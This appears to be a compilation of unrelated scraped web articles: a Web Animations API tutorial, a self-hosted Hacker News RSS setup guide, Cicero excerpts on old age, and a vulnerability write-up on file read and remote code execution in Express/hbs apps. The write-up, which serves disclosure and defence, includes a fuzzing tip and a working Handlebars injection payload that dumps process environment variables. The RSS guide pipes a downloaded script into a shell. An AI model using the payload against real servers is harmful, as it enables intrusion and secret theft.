}</code></pre><p><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Animations/Using_CSS_animations" target="_blank" rel="noopener">CSS animations</a>
offer more control over timing and easing. They can run for a given duration,
have a delay and an iteration count. The animation itself is specified with
keyframes allowing the creation of more complicated animation effects that are
not possible with CSS transitions. CSS animations are usually triggered by
adding or removing a CSS class to an element with JavaScript.</p>
<pre><code><span>@keyframes</span> fade-in-keyframes {
  0% {
    <span>opacity</span>: <span>0</span>;
  }
  50% {
    <span>opacity</span>: <span>0.2</span>;
  }
  100% {
    <span>opacity</span>: <span>1</span>;
  }
}

<span>.fade-in</span> {
  <span>animation</span>: fade-in-keyframes <span>0.3s</span> linear;
}</code></pre><p>Both of these offer JavaScript events like <code>animationend</code> which allow you to
react to an animation that finished, though it can still be hard to synchronize
animations with application state due to the way animations have to be started.
They are a powerful, declarative and performant way to do animations on
individual elements.</p>
<h3 id="animating-with-javascript">Animating with JavaScript</h3>
<p>JavaScript based animation loops are the status quo for doing complex
animations. Animation libraries like
<a href="https://ember-animation.github.io/ember-animated/" target="_blank" rel="noopener">ember-animated</a> and
<a href="https://www.framer.com/motion/" target="_blank" rel="noopener">framer-motion</a> or older libraries like
<a href="http://velocityjs.org/" target="_blank" rel="noopener">Velocity.js</a> and
<a href="https://github.com/madrobby/scriptaculous" target="_blank" rel="noopener">script.aculo.us</a> are built around
this technique.</p>
<p>With a JavaScript based animation loop there is full control over timing and
state. This makes it possible to take other elements into account. For example,
you could take measurements of an element A and animate an element B from the
position and size of element A to element B's natural position.</p>
<p>A basic animation loop takes a source and target state and based on a timing
function calculate what the state for the current frame should be.</p>
<pre><code><span>let</span> sourceOpacity = <span>0</span>;
<span>let</span> targetOpacity = <span>1</span>;
<span>let</span> duration = <span>500</span>;

<span>let</span> startTime;
<span><span>function</span> <span>step</span>(<span>time</span>) </span>{
  <span>if</span> (!startTime) {
    startTime = time;
  }

  <span>let</span> progress = time - startTime;

  
  <span>let</span> factor = <span>Math</span>.min(progress / duration, <span>1</span>);

  
  <span>let</span> currentOpacity = sourceOpacity + (targetOpacity - sourceOpacity) * factor;

  
  element.style.opacity = currentOpacity;

  
  <span>if</span> (progress &lt; duration) {
    <span>window</span>.requestAnimationFrame(step);
  }
}


<span>window</span>.requestAnimationFrame(step);</code></pre><p>In the past, animation loops with JavaScript had to be done through
<code>setInterval</code> to get an approximate 60 frames per second animation. Nowadays the
<code>requestAnimationFrame</code> API exists which results in smoother animation as the
browser will call it right before the next repaint. Browsers can also pause
<code>requestAnimationFrame</code> when a tab is out of focus to prevent inactive tabs from
running expensive animations at high framerates.</p>
<p>In addition, this animation technique requires the need for manual interpolation
of the values we might want to animate. This can be difficult for complex values
like <code>color</code> or <code>clipPath</code>, yet also gives opportunity to do different kinds of
interpolation than what the browser does by default, which can be especially
relevant for non-trivial values like a color space.</p>
<p>While this animation technique is very powerful it does result in a lot of
calculations being made every frame for the duration of the animation. This
might result in stutter or delay especially if something else is happening on
the page. Examples are a router transition to another page or some data fetching
and parsing. The browser also has limited ways to optimise such animations as it
only knows about the current frame and cannot completely offload the animation
to the GPU.</p>
<h2 id="web-animations-api">Web Animations API</h2>
<p>The <a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Animations_API" target="_blank" rel="noopener">Web Animations API</a> is a relatively new addition to the browser and is
still very much in development. It promises to combine the benefits of CSS
Transitions/Animations and JavaScript based animations.</p>
<p>All popular browsers have now implemented the minimum features necessary to do
complex animations and a
<a href="https://github.com/web-animations/web-animations-js" target="_blank" rel="noopener">polyfill</a> which adds
support for the Web Animations API to older browsers is available. It's time we
tried it out!</p>
<h3 id="the-basics">The basics</h3>
<p>The main interface for Web Animations is the <code>Element.animate</code> function. It can
be called on a DOM Element, takes an array of keyframes as the first argument
and options as the second argument. On first sight the API is very similar to
CSS animations.</p>
<pre><code><span>&lt;<span>div</span> <span>id</span>=<span>"circle"</span>&gt;</span><span>&lt;/<span>div</span>&gt;</span>

<span>&lt;<span>script</span> <span>type</span>=<span>"text/javascript"</span>&gt;</span><span>
  <span>let</span> element = <span>document</span>.getElementById(<span>'circle'</span>);
  <span>let</span> animation = element.animate([{ <span>opacity</span>: <span>0</span> }, { <span>opacity</span>: <span>1</span> }], {
    <span>duration</span>: <span>300</span>,
    <span>easing</span>: <span>'linear'</span>,
  });
</span><span>&lt;/<span>script</span>&gt;</span></code></pre><p>We'll need only a "from" and a "to" keyframe for now. The easing we set will
define the timing function used to interpolate between the keyframes. For now,
we will use the most basic one: "linear".</p>
<p>In addition to that there's some useful timing related functionality on the
animation instance we can use.</p>
<pre><code>
<span>let</span> animation = element.animate(...);


animation.pause();


<span>let</span> timing = animation.effect.getComputedTiming();


timing.progress;


animation.play();


animation.finished.then(<span>() =&gt;</span> { ... });</code></pre><p>With these building blocks we can start creating more complex animations.</p>
<h3 id="moving-an-element-around">Moving an element around</h3>
<p>Let's create an animation which applies a CSS transform to move the element from
one position to another.</p>
<pre><code>element.animate(
  [{ <span>transform</span>: <span>'translateX(0)'</span> }, { <span>transform</span>: <span>'translateX(100px)'</span> }],
  {
    <span>duration</span>: <span>1000</span>,
    <span>easing</span>: <span>'linear'</span>,
  },
);</code></pre><p>This will transform the element 100 pixels to the right from its original
position in 1 second with a linear timing function. When the animation is done,
its effects on the element are automatically removed.</p>
<figure><video src="https://simplabs.com/assets/images/posts/2021-01-29-web-animations-intro/video1.mp4#video" playsinline="" autoplay="" muted="" loop="" role="presentation">Basic move animation</video></figure><p>Like with CSS animations we need to specify a fill option to specify in what way
we want the animation's effects to be retained. We can specify <code>fill: forwards</code>
so our final state is retained.</p>
<pre><code>element.animate(
  [{ <span>transform</span>: <span>'translateX(0)'</span> }, { <span>transform</span>: <span>'translateX(100px)'</span> }],
  {
    <span>duration</span>: <span>1000</span>,
    <span>easing</span>: <span>'linear'</span>,
    <span>fill</span>: <span>'forwards'</span>,
  },
);</code></pre><p>Our animation now behaves as we would expect and retains the styles specified in
the final keyframe.</p>
<figure><video src="https://simplabs.com/assets/images/posts/2021-01-29-web-animations-intro/video2.mp4#video" playsinline="" autoplay="" muted="" loop="" role="presentation">Basic move animation that retains final state</video></figure><p>Alternatively the <code>animation.commitStyles()</code> feature can be used to put the
current animation state in the DOM as inline styles. The animation itself can
then safely be cancelled so the browser can free up the resources it consumes.</p>
<h3 id="cancelling-and-resuming-an-animation">Cancelling and resuming an animation</h3>
<p>Cancellation is an important part of real-world animations. Animations take time
to complete and in that time the user might have interacted with the page in a
way where the running animation does not make sense anymore. In most cases when
an animation is interrupted, another animation will be started. This could be
the same animation in reverse or an entirely different one. In any case we will
want to start the animation from the element's current state.</p>
<p>In theory, you only need to specify a "to" keyframe which would make it trivial
to cancel an animation as the browser will calculate the "from" position based
on the current state. Unfortunately not all browsers currently support that
behaviour meaning we'll have to be a little more elaborate for now.</p>
<p>In order to cancel the current animation (if any) we'll need to take a few
steps. Before trying to calculate our starting keyframe we'll need to pause the
currently running animation (if any). Then we'll need to get the current
transform present on our element. Finally, we can start the new animation.</p>
<p>Let's abstract our animation into a <code>move</code> function which takes <code>transformStart</code>
and <code>transformEnd</code> string arguments. We'll also add <code>animateRight</code> and
<code>animateLeft</code> functions which are hooked up to two buttons, so we can run the
animations by clicking those buttons.</p>
<pre><code><span>&lt;<span>button</span> <span>onclick</span>=<span>"animateLeft()"</span>&gt;</span>Left<span>&lt;/<span>button</span>&gt;</span>
<span>&lt;<span>button</span> <span>onclick</span>=<span>"animateRight()"</span>&gt;</span>Right<span>&lt;/<span>button</span>&gt;</span>
<span>&lt;<span>div</span> <span>id</span>=<span>"circle"</span>&gt;</span><span>&lt;/<span>div</span>&gt;</span>

<span>&lt;<span>script</span>&gt;</span><span>
  <span>const</span> element = <span>document</span>.getElementById(<span>'circle'</span>);

  <span>let</span> currentAnimation;

  <span><span>function</span> <span>move</span>(<span>transformStart, transformEnd</span>) </span>{
    currentAnimation = element.animate(
      [{ <span>transform</span>: transformStart }, { <span>transform</span>: transformEnd }],
      {
        <span>duration</span>: <span>1000</span>,
        <span>easing</span>: <span>'linear'</span>,
        <span>fill</span>: <span>'forwards'</span>,
      },
    );
  }

  <span><span>function</span> <span>animateRight</span>(<span></span>) </span>{
    move(<span>'translateX(0)'</span>, <span>'translateX(100px)'</span>);
  }

  <span><span>function</span> <span>animateLeft</span>(<span></span>) </span>{
    move(<span>'translateX(100px)'</span>, <span>'translateX(0)'</span>);
  }
</span><span>&lt;/<span>script</span>&gt;</span></code></pre><p>Rapidly clicking the buttons interchangeably now shows a pretty jarring
animation!</p>
<figure><video src="https://simplabs.com/assets/images/posts/2021-01-29-web-animations-intro/video3.mp4#video" playsinline="" autoplay="" muted="" loop="" role="presentation">Basic move animation</video></figure><p>This is a good time to take a look at the developer tools to find out what's
going on. Note that you will not see the animated styles appear in the DOM as
you might be used to with JavaScript based animation. You can see the effect
they have in the computed styles and animation sections of the browser's
developer tools.</p>
<p>From the "Animations" pane we can slow down the animation to 25% of the original
speed to make it easier to see what is going on. We can also replay previous
animations. When we click the "Left" button while the animation is happening
we'll see that the animation is not starting at the correct point.</p>

obviously an incorrect starting point if we interrupt the animation in the
middle.</p>
<p>We can fix this by first pausing the animation. Next we can utilise the global
<code>getComputedStyle(element)</code> function to retrieve the current styles for our
element. We'll take the computed <code>transform</code> style as the starting point for our
keyframe. After doing this we …</p></div></div>

    <h2 id="hn-hijacks-your-brain">HN hijacks your brain</h2>
<p>You're an engineer who looks at Hacker News 2-5 times a day. HN is a good way to <em>fill the gaps</em> in time. You scan the front page- repeatedly- for links of interest... reading titles, eyeing scores... often jumping directly to the (overtly contrarian) comments to see if a link is even worth the energy.</p>
<p>Sound familiar?</p>
<p>That cycle hits a sickening <strong>5</strong>/10 of Tristan Harris's <a href="https://medium.com/thrive-global/how-technology-hijacks-peoples-minds-from-a-magician-and-google-s-design-ethicist-56d62ef5edf3">list of mind hijacks</a>:</p>
<ul>
<li>(1)  Control the Menu, Control the Choices</li>
<li>(3)  Fear of missing something important</li>
<li>(4)  Social Approval (upvotes)</li>
<li>(6)  Bottomless bowl</li>
<li>(10) Forecasting</li>
</ul>
<blockquote>
<p>These hijacks  <a href="https://en.wikipedia.org/wiki/Hanlon%27s_razor">aren't</a> intentional, they're just a byproduct of link aggregation platforms.</p>
</blockquote>
<p>Stoics are turning in their graves, where instead of knowing what's important, the links on HN <em>become</em> what's important, no matter how trivial, pedantic, hyped, or irrelevant.</p>
<p>So if you want help breaking this negative feedback loop, I encourage you to reclaim your attention by turning HN into and RSS feed;</p>
<p>Get more <a href="https://medium.com/@bre/the-cult-of-done-manifesto-724ca1c2ff13">done</a>. Ignore the comments and the <a href="https://www.ribbonfarm.com/2020/01/16/the-internet-of-beefs/">mooks</a>. Set limits. It's incredibly liberating to finish your RSS feed and think to yourself, <em>now what</em>?</p>

<p>Declaring what deserves your attention is the defining feature of RSS, so it's important to declare what aspect of HN you like. Generally people look at high scores. Fortunately HN already has a url specifically for its most "important" (i.e. upvoted) links: <a href="https://news.ycombinator.com/best"><code>/best</code></a>.</p>
<p>So if we can subscribe to the links from that page, we'll get the bulk of the links that deserve our attention.</p>
<p>For me, it's critically important for RSS to be a self-hosted solution. No third parties <small>(I'm looking at <em>you</em>, Feedly)</small>.</p>
<p>Otherwise, what's the point of retaking control, you're just shunting control to yet another third party.</p>
<p>My personal setup goes like this:</p>
<ul>
<li>Get the Raspberry Pi you bought but never used</li>
<li>Install Docker</li>
<li>Run FreshRSS</li>
<li>Add HN <a href="https://news.ycombinator.com/best"><code>/best</code></a> as an RSS feed</li>
<li>(Optional) Port forwarding and DNS setup</li>
<li>(Optional) Pick out a smartphone app to sync with</li>
</ul>
<p>This is just the first thing that worked for me, so by no means is it the guaranteed best. Recommendations and alternatives are welcome! You can, of course, tailor the following guide if you'd like to use a VPS.</p>

<h3 id="prepare-the-pi">Prepare the Pi</h3>
<h4 id="install-git">Install git</h4>
<p>Do a standard Raspbian setup the with <a href="https://soapstone.mradford.com/raspberry-pi-automatic-wifi-and-ssh">internet/ssh/hostname</a>. Then install git:</p>
<pre><span>sudo</span><span> apt-get install git
</span></pre><h4 id="install-docker">Install Docker</h4>
<pre><span>curl -sSL</span><span> https://get.docker.com | </span><span>sh
</span></pre><pre><span>sudo</span><span> usermod</span><span> -aG</span><span> docker pi &amp;&amp; </span><span>sudo</span><span> reboot
</span></pre><h4 id="install-docker-compose">Install Docker-compose</h4>
<blockquote>
<p>This method is specifically for Raspbian, if you're using a VPS or non-ARM machine, install docker-compose the <a href="https://docs.docker.com/compose/install/">conventional</a> way.</p>
</blockquote>
<pre><span>sudo</span><span> apt-get install</span><span> -y</span><span> libffi-dev libssl-dev
</span><span>sudo</span><span> apt-get install</span><span> -y</span><span> python3 python3-pip
</span><span>sudo</span><span> apt-get remove python-configparser
</span><span>sudo</span><span> pip3 install docker-compose
</span></pre>
<pre><span>git</span><span> clone https://github.com/FreshRSS/FreshRSS

cd FreshRSS/Docker
</span></pre>
<p>We're using a Raspberry Pi, so you'll need to pick out the ARM image! Use your favorite editor to modify these lines of the <code>docker-compose.yml</code> file:</p>
<pre><span># docker-compose.yml
</span><span>-    image: freshrss/freshrss:latest
</span><span>+    image: freshrss/freshrss:arm
</span></pre>
<p>Now you're ready to execute FreshRSS:</p>
<pre><span>docker-compose</span><span> up</span><span> -d
</span></pre>
<p>Once that's complete, head to your Pi's IP address (or hostname, if you opted for that) on port <code>8080</code> in your laptop's/desktop's browser (something like http://1.2.3.4:8080), and go through the initial setup.</p>

<p>Add <code>https://hnrss.org/best</code> as an RSS feed (from <a href="https://hnrss.github.io/">hnrss.github.io</a>).</p>
<p>Congratulations! You've officially RSS-ified HN!</p>
<h3 id="optional-port-forwarding-and-dns-setup">(Optional) Port forwarding and DNS setup</h3>
<p>Unless you went with the VPS route, you're probably behind a LAN, so if you want to access your RSS outside your LAN, you'll need to set up port forwarding and/or DNS. That's beyond the scope of this guide, but there are many guides online that can get you there.</p>
<h3 id="optional-pick-out-an-app">(Optional) Pick out an app</h3>
<p>You could just expose the pi to the internet, and read RSS directly from the browser, but I think having an app is a nice touch.</p>
<p>First you'll need to enable API access in FreshRSS. Go to <code>Authentication</code> and check the box to allow API access:</p>
<p><img src="https://soapstone.mradford.com/freshrss-auth.png" alt="fresh-rss-screenshot1"></p>
<p>Then create an API key under <code>Profile</code>:</p>
<p><img src="https://soapstone.mradford.com/freshrss-profile.png" alt="fresh-rss-screenshot2"></p>
<p>Now you can use the API url and the API key in your selected app to pull data down locally. Nice!</p>
<p>Here's a non-exhaustive list of open-source (Android) apps to get you started.</p>
<ul>
<li><a href="https://github.com/readrops/Readrops">Readrops</a> - <a href="https://play.google.com/store/apps/details?id=com.readrops.app">play store</a></li>

<li><a href="https://github.com/fistons/TinyTinyFeed">TinyTinyFeed</a> - <a href="https://play.google.com/store/apps/details?id=org.poopeeland.tinytinyfeed">play store</a></li>
</ul>
<blockquote>
<p>Truth be told, a lot of the closed source RSS apps I've checked out tend to be slightly higher in quality, so if you're willing to compromise on that front then they are worth exploring.</p>
</blockquote>
<h2 id="what-did-we-gain">What did we gain?</h2>
<p>It may not seem like it, but we've gained a <strong>lot</strong> by doing this!</p>
<ul>
<li><strong>Defeated the mind hijacks</strong>:
<ul>
<li><strike>(1)</strike> Gained leverage over the "menu"</li>
<li><strike>(3)</strike> Declared which things are important up front, and view them only <em>once</em></li>
<li><strike>(4)</strike> Ignore comments. Scores only matter in that they are relatively high</li>
<li><strike>(6)</strike> Created a bottom (of the bowl) by grabbing a limited number of links</li>
<li><strike>(10)</strike> Easily defer time intensive links for later</li>
</ul>
</li>
<li><strong>Time</strong>
<ul>
<li>Prevent re-reads of HN</li>
<li>Make it easier to pick out the most interesting links and discard irrelevant ones</li>
<li>If you <em>really</em> want to read comments, you'll need to go out of your way</li>
<li>Star or bookmark links to read more in-depth at a later time</li>
</ul>
</li>
<li><strong>Data sovereignty</strong>
<ul>
<li>We control our own data; no relying on third parties (e.g. Feedly)</li>

His writings include books on rhetoric, orations, philosophical and political treatises, and letters. He is remembered in modern times as the greatest Roman orator.</p><h2>1. Old age is not unique in being burdensome…</h2><blockquote><p>I think, my friends, that you marvel at a thing really far from difficult. <strong>For to those who have not the means within themselves of a virtuous and happy life every age is burdensome</strong>; and, on the other hand, to those who seek all good from themselves nothing can seem evil that the laws of nature inevitably impose. <strong>To this class old age especially belongs, which all men wish to attain and yet reproach when attained; such is the inconsistency and perversity of Folly!</strong></p><p>They say that it stole upon them faster than they had expected. In the first place, who has forced them to form a mistaken judgement? For how much more rapidly does old age steal upon youth than youth upon childhood? And again, how much less burdensome would old age be to them if they were in their eight hundredth rather than in their eightieth year? <strong>In fact, no lapse of time, however long, once it had slipped away, could solace or soothe a foolish old age</strong>.</p></blockquote><h2>2. … but it is only praiseworthy if the life preceding it was well spent…</h2><blockquote><p>But bear well in mind that in this entire discussion <strong>I am praising that old age which has its foundation well laid in youth</strong>. Hence it follows— as I once said with the approval of all who heard it— that that old age is wretched which needs to defend itself with words! Nor can wrinkles and grey hair suddenly seize upon influence; <strong>but when the preceding part of life has been nobly spent, old age gathers the fruits of influence at the last</strong>.</p><p>For if the ills of which they complained were the faults of old age, the same ills would befall me and all other old men; but I have known many who were of such a nature that they bore their old age without complaint, who were not unhappy because they had been loosed from the chains of passion, and who were not scorned by their friends. <strong>But as regards all such complaints, the blame rests with character, not with age.</strong> For old men of self-control, who are neither churlish nor ungracious, find old age endurable; while <strong>on the other hand <a href="https://butwhatfor.substack.com/p/invert-always-invert-avoid-failure">perversity and an unkindly disposition render irksome every period of life</a></strong>…</p><p>Undoubtedly, Scipio and Laelius, <strong>the most suitable defenses of old age are the principles and practice of the virtues</strong>, which, if cultivated in every period of life, bring forth wonderful fruits at the close of a long and busy career, not only because they never fail you even at the very end of life—although that is a matter of highest moment—but also <strong>because it is most delightful to have the consciousness of a life well spent and the memory of many deeds worthily performed</strong>.</p></blockquote><h2>3. … and the mind and body sufficiently prepared.</h2><blockquote><p><strong>But it is our duty, my young friends, to resist old age</strong>; to compensate for its defects by a watchful care; to fight against it as we would fight against disease; to adopt a regimen of health; to practice moderate exercise; and to take just enough of food and drink to restore our strength and not to overburden it. Nor, indeed, are we to give our attention solely to the body; <strong>much greater care is due to the mind and soul; for they, too, like lamps, grow dim with time, unless we keep them supplied with oil. </strong></p><p>For when Caecilius speaks of " the old fools of the comic stage," he has in mind old men characterized by credulity, forgetfulness, and carelessness, which are faults, not of old age generally, but only of an old age that is drowsy, slothful, and inert. </p></blockquote><h2>4. If prepared in this way, old age contributes more to the world that it’s youth.</h2><blockquote><p>Those, therefore, who allege that old age is devoid of useful activity adduce nothing to the purpose, and are like those who would say that the pilot does nothing in the sailing of the ship, because, while others are climbing the masts, or running about the gangways, or working at the pumps, he sits quietly in the stern and simply holds the tiller. </p><p>He may not be doing what younger members of the crew are doing, but what he does is better and much more important. <strong><a href="https://medium.com/butwhatfor/perseverance-is-great-but-dont-forget-to-prepare-ea8d5fe7e6fb">It is not by muscle, speed, or physical dexterity that great things are achieved, but by reflection, force of character, and judgement</a></strong>; in these qualities old age is usually not only not poorer but is even richer.</p></blockquote><h2>5. Old age should not fear the nearness of death as it is not unique to old age…</h2><blockquote><p><strong>And yet is there anyone so foolish, even though he is young, as to feel absolutely sure that he will be alive when evening comes</strong>? Nay, even youth, much more than old age, is subject to the accident of death; the young fall sick more easily, their sufferings are more intense, and they are cured with greater difficulty. </p><p>Therefore, <strong>few arrive at old age</strong>, and, but for this, life would be lived in better and wiser fashion. For it is in old men that reason and good judgement are found, and had it not been for old men no state would have existed at all.</p><p>But I return to the question of impending death. <strong>What fault is this which you charge against old age, when, as you see, it is one chargeable likewise to youth? </strong>That death is common to every age has been brought home to me by the loss of my dearest son.</p><p>They say, also, that the old man has nothing even to hope for. <strong>Yet he is in better case than the young man</strong>, since what the latter merely hopes for, the former has already attained; <strong>the one wishes to live long, the other has lived long</strong>.</p></blockquote><h2>6. … and a life well lived lives well beyond its own years…</h2><blockquote><p>The actor, for instance, to please his audience need not appear in every act to the very end; it is enough if he is approved in the parts in which he plays; and so <strong><a href="https://butwhatfor.substack.com/p/takeaway-tuesday-knowing-history">it is not necessary for the wise man to stay on this mortal stage to the last fall of the curtain</a></strong>. For even if the allotted space of life be short, it is long enough in which to live honorably and well; but if a longer period of years should be granted, one has no more cause to grieve than the farmers have that the pleasant springtime has passed and that summer and autumn have come. </p><p>Would it not have been far better for me to spend a leisured and quiet life, free from toil and strife? <strong>But somehow, my soul was ever on the alert, looking forward to posterity, as if it realized that when it had departed from this life, then at last would it be alive</strong>.</p></blockquote><h2>7. … with nothing to regret when its course has been run.</h2><blockquote><p><strong>For what advantage has life—or, rather, what trouble does it not have?</strong> But even grant that it has great advantage, yet undoubtedly it has either satiety or an end. I do not mean to complain of life as many men, and they learned ones, have often done; <strong>nor do I regret that I have lived, since I have so lived that I think I was not born in vain</strong>, and I quit life as if it were an inn, not a home. For Nature has given us an hostelry in which to sojourn, not to abide.</p><p><strong>For as Nature has marked the bounds of everything else, so she has marked the bounds of life</strong>. Moreover, old age is the final scene, as it were, in life’s drama, from which we ought to escape when it grows wearisome, and certainly, when we have had our fill. </p><p>Such, my friends, are my views on old age. <strong>May you both attain it, and thus be able to prove by experience the truth of what you have heard from me</strong>.</p></blockquote><p><strong><a href="https://www.butwhatfor.com/">But What For?</a></strong> - Multidisciplinary insights for self development.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p><img src="https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/banner.png" alt=""></p>
<h3 id="TL-DR"><a href="#TL-DR" title="TL;DR"></a>TL;DR</h3><p>If you are using ExpressJs with Handlebars as templating engine invoked via <a href="https://www.npmjs.com/package/hbs" target="_blank" rel="noopener">hbs</a> view engine, for Server Side Rendering, you are likely vulnerable to Local File Read (LFR) and potential Remote Code Execution (RCE).</p>
<h3 id="BugBountyTip💰"><a href="#BugBountyTip💰" title="#BugBountyTip💰"></a>#BugBountyTip💰</h3><ol>
<li>If the target is responding with <code>X-Powered-By: Express</code> and there is HTML in responses, it’s highly likely that NodeJs with server-side templating is being used.</li>
<li>Add <code>layout</code> in your wordlist of parameter discovery/fuzzing for GET query or POST body. </li>
<li>If the arbitrary value of <code>layout</code> parameter added is resulting in <code>500 Internal Server Error</code> with <code>ENOENT: no such file or directory</code> in body, You have hit the LFR. </li>
</ol>
<h3 id="Details"><a href="#Details" title="Details"></a>Details</h3><p>About more than a week back, I stumbled upon a critical Local File Read (LFR) security issue which had the potential to give Remote Code Execution in a fairly simple ~10 lines of <code>NodeJS/ExpressJs</code> code which looked like the following:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></pre></td><td><pre><span><span>var</span> express = <span>require</span>(<span>'express'</span>);</span><br><span><span>var</span> router = express.Router();</span><br><span></span><br><span>router.get(<span>'/'</span>, <span><span>function</span>(<span>req, res, next</span>) </span>{</span><br><span> 	res.render(<span>'index'</span>)</span><br><span>});</span><br><span></span><br><span>router.post(<span>'/'</span>, <span><span>function</span>(<span>req, res, next</span>) </span>{</span><br><span>	<span>var</span> profile = req.body.profile</span><br><span> 	res.render(<span>'index'</span>, profile)</span><br><span>});</span><br><span></span><br><span><span>module</span>.exports = router;</span><br></pre></td></tr></tbody></table></figure>
<p><em>The whole source can be found <a href="https://github.com/CaptainFreak/Web-CTF-Challenges/tree/main/profiler" target="_blank" rel="noopener">here.</a></em></p>
<p>If you are even a little bit familiar with NodeJs Ecosystem and have written at least your first <code>Hello World</code> endpoint in <code>ExpressJs</code>, you will certify that this is clearly straightforward and innocent code.</p>
<p>So after getting surprised and disillusioned by the security bug, I remembered that It’s indeed called <strong><code>Dependency Hell</code></strong>. To be honest, I should not have been that surprised.</p>
<p>The betrayal by in-built modules, dependencies, and packages have been the reason to introduce numerous security bugs. This is a re-occurring theme in software security anyway.</p>
<p>To check out if this is a known issue or not, I created a CTF challenge and shared it with many of my talented friends belonging to multiple community forums of Web Security, Node, Backend Engineering, CTFs, and BugBounty.</p>
<blockquote data-lang="en" data-theme="dark">— CaptainFreak (@0xCaptainFreak) <a href="https://twitter.com/0xCaptainFreak/status/1350083997854928897?ref_src=twsrc%5Etfw" target="_blank" rel="noopener">January 15, 2021</a></blockquote> 
<p>Turns out this was not known, Even after giving the whole <a href="https://github.com/CaptainFreak/Web-CTF-Challenges" target="_blank" rel="noopener">source code</a> of the challenge, only 4 people were able to solve it (all CTFers 🥳):</p>
<ol>

<li><a href="https://twitter.com/po6ix" target="_blank" rel="noopener">@po6ix</a></li>
</ol>
<p>Congrats to all the solvers 🎊 and thanks a lot to everybody who tried out the challenge.</p>
<p>For the people who still wanna try out, I plan to keep the <a href="http://ctf.shoebpatel.com:9090/" target="_blank" rel="noopener">Profiler Challenge</a> up for one more week. Stop Reading and check it out now!</p>

<p>That’s It! What the heck, right? You might be thinking, what even is this <code>layout</code> parameter? and where is it even coming from. Soo out of context! </p>

<p>We can stop analysing here, as you can see on <code>Line 22</code> we effectively read from the <code>Root Views Dir + layout</code> and pass it to <a href="https://github.com/handlebars-lang/handlebars.js#usage" target="_blank" rel="noopener">handlebars.compile</a> which gives us the HTML after compiling the given file which we completely control (Except the extension cause it’s added explicitly from the config to the path if not provided already. <code>Line. 12</code>). </p>
<p>Hence the LFR, <strong>we can read any files with extensions.</strong></p>
<h2 id="RCE-💣"><a href="#RCE-💣" title="RCE 💣"></a>RCE 💣</h2><p>As the templating is involved, we do have a strong potential for RCE. It has the following pre-requisites though:</p>
<ol>
<li>Through the above LFR read <code>./../package.json</code>.</li>
<li>See the version of hbs being used, it should be &lt;= <code>4.0.3</code>.  Because after this version, the <code>hbs</code> team started using <code>Handlebars.js of version &gt;= 4.0.14</code>, <a href="https://github.com/pillarjs/hbs/blob/5d71299ea6309452975a379cf9c156245f9cb6f8/package.json" target="_blank" rel="noopener">Commit Link</a>. </li>
<li>In Handlebars below this version, it was possible to create RCE payloads. There is an <a href="https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html" target="_blank" rel="noopener">awesome writeup</a> on this by <a href="https://twitter.com/Zombiehelp54" target="_blank" rel="noopener">@Zombiehelp54</a> with which they got RCE on Shopify.</li>
<li>And you should have a functionality of file upload on the same box with a known location, which is quite an ask considering everybody uses blob storage these days, but we never know 🤷‍♂️</li>
</ol>
<p>With above fulfilled, you can write a handlebars template payload like below to get RCE:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br></pre></td><td><pre><span>&lt;!-- (by [@avlidienbrunn](https://twitter.com/avlidienbrunn)) --&gt;</span><br><span></span><br><span>{{#with "s" as |string|}}</span><br><span>  {{#with "e"}}</span><br><span>    {{#with split as |conslist|}}</span><br><span>      {{this.pop}}</span><br><span>      {{this.push (lookup string.sub "constructor")}}</span><br><span>      {{this.pop}}</span><br><span>      {{#with string.split as |codelist|}}</span><br><span>        {{this.pop}}</span><br><span>        {{this.push "return JSON.stringify(process.env);"}}</span><br><span>        {{this.pop}}</span><br><span>        {{#each conslist}}</span><br><span>          {{#with (string.sub.apply 0 codelist)}}</span><br><span>            {{this}}</span><br><span>          {{/with}}</span><br><span>        {{/each}}</span><br><span>      {{/with}}</span><br><span>    {{/with}}</span><br><span>  {{/with}}</span><br><span>{{/with}}</span><br></pre></td></tr></tbody></table></figure>
<h2 id="Fix-🤕"><a href="#Fix-🤕" title="Fix 🤕"></a>Fix 🤕</h2><p>Easy fix would be to stop using the code anti-pattern shown in the above example like below:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>❌ res.render('index', profile)</span><br></pre></td></tr></tbody></table></figure>
<p>v/s</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>✅ res.render('index', { profile })</span><br></pre></td></tr></tbody></table></figure>
<p>which I think many devs use already so that they can be more descriptive in templates with the usage of just “{{name}}” vs “{{profile.name}}”.</p>
<p>But think for a second again, is the above code safe? Yea sure, we don’t have a way to provide <code>layout</code> in the options argument to <code>res.render</code> anymore. But is there any way to still introduce the culprit <code>layout</code> parameter?</p>
<h3 id="Prototype-Pollution"><a href="#Prototype-Pollution" title="Prototype Pollution!"></a>Prototype Pollution!</h3><p>It would be ignorant if we don’t mention proto pollution in a Js/NodeJs Web Security writeup 🙃 !</p>
<p>Readers who are unaware of proto pollution, please watch this <a href="https://www.youtube.com/watch?v=LUsiFV3dsK8" target="_blank" rel="noopener">awesome talk</a> from Olivier Arteau at NorthSec18.</p>
<p>As you can see, even the most common pattern (<code>res.render('template', { profile })</code>) of passing objects to render function is not safe, If the application has prototype pollution at any place with which an attacker can add <code>layout</code> to prototype chain, the output of every call to <code>res.render</code> will be overwritten with LFR/RCE. So we have DoS-ish LFR/RCE! With presence of exploitable proto pollution, this becomes quite a good gadget plus becomes unfixable unless we fix proto pollution.</p>
<p><strong>Solid Fix</strong></p>
<ol>
<li>First fix proto pollution if you are vulnerable to it.</li>
<li>and you can remove the <code>layout</code> key from the object or do whatever to stop it from reaching that vulnerable Sink.</li>
</ol>
<p>Let me know what you think should be the proper fix?</p>

